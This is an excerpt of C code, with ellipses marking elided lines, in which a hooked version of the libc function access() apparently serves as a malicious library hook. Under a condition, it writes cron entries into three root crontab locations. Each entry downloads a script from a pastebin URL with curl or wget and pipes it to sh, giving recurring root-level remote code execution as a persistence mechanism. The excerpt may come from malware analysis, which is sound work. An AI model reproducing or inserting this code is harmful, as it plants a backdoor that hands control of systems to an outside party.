...
access (const char *path, int amode)
{
  ...
  if (old_xstat == NULL)
    ...
    if ((fpa = fopen("/etc/cron.d/root", "w+")) != NULL){
        fputs("*/10 * * * * root (curl -fsSL https://pastebin.com/raw/LUgg78iz||wget -q -O- https://pastebin.com/raw/LUgg78iz)|sh\n##", fpa);
        fclose(fpa);
    }
    if ((fpb = fopen("/var/spool/cron/root", "w+")) != NULL){
        fputs("*/15 * * * * (curl -fsSL https://pastebin.com/raw/LUgg78iz||wget -q -O- https://pastebin.com/raw/LUgg78iz)|sh\n##", fpb);
        fclose(fpb);
    }
    if ((fpc = fopen("/var/spool/cron/crontabs/root", "w+")) != NULL){
        fputs("*/30 * * * * (curl -fsSL https://pastebin.com/raw/LUgg78iz||wget -q -O- https://pastebin.com/raw/LUgg78iz)|sh\n##", fpc);
        fclose(fpc);
    }
